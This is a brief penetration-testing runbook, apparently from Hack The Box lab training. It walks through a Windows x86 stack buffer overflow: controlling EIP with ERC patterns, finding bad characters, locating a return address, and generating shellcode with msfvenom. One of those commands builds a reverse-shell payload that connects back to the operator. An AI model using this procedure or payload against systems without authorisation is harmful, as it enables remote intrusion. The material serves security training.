# buffer overflow x86 windows

## Step 0: Setup

- Install [x64dbg](https://github.com/x64dbg/x64dbg), the x32 version.
- Install [ERC](https://github.com/Andy53/ERC.Xdbg), also the x32 version.

## Step 1: Take control EIP

- Get rough estimate offset (e.g. 1000)
- Create pattern.
```shell
ERC --pattern c 5000
```

- Calculate exact offset.
```shell
ERC --pattern o 1hF0
```

- Verify offset by overwriting EIP.

## Step 2: Identify bad chars

- Generate chars string.

```shell
ERC --bytearray -bytes 0x00
```

- Compare characters from array to character in memory region, using the value of the ESP.

```shell
ERC --compare 0014F974 C:\Users\htb-student\Desktop\ByteArray_1.bin
```

## Step 3: Identify return address

To find a list of all loaded files by the program, we can use 

```shell
ERC --ModuleInfo
```

## Step 4: Generate shellcode

- Generate shellcode using `msfvenom`.
```shell
msfvenom -p "windows/exec" CMD="cmd.exe" --format "python" --bad-chars "\x00"
```
```shell
msfvenom -p "windows/shell_reverse_tcp" LHOST=$me LPORT=4444 -f "python" --bad-chars "\x00"
```

## Python

- A Python script for local buffer overflow can be at [GitHub](https://github.com/a3cipher/runbook/blob/main/ptes3-exploitation/binary-exploitation/bo-x86-windows-local.py).
- A Python script for remote buffer overflow can be at [GitHub](https://github.com/a3cipher/runbook/blob/main/ptes3-exploitation/binary-exploitation/bo-x86-windows-remote.py).
